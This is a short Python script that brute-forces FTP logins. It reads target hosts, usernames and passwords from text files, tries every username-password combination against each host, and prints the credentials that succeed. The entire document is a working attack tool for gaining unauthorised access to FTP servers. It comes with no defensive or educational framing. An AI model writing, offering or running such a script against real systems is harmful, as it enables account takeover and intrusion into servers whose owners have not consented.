import ftplib

def main():
    with open('targets.txt', 'r') as f:
         targest_space = f.read()
         targets = targest_space.split()
         for host in targets:
             print(f'SELECT Target: {host}')
             try:
                with open('ftp_login.txt', 'r') as f: #Read Logins list file
                     user_free = f.read()
                     users = user_free.split()
                     with open('ftp_password.txt', 'r') as f: # Read Passwords list file
                          pass_free = f.read()
                          passwords = pass_free.split()
                          for username in users:
                              for password in passwords:
                                  print(f'Now try: user {username}:{password}')
                                  ftp = ftplib.FTP(host)
                                  try:
                                     ftp.login(username, password)
                                     print(f'Successfully connected {ftp.connect()}')
                                     ftp.quit()
                                     print(f'Host: {host}\nUsername: {username}\nPassword: {password}')
                                  except:
                                        pass

             except Exception as e:
                    print(f'FTP error {e}')
                    pass


if __name__ == "__main__":
   main()
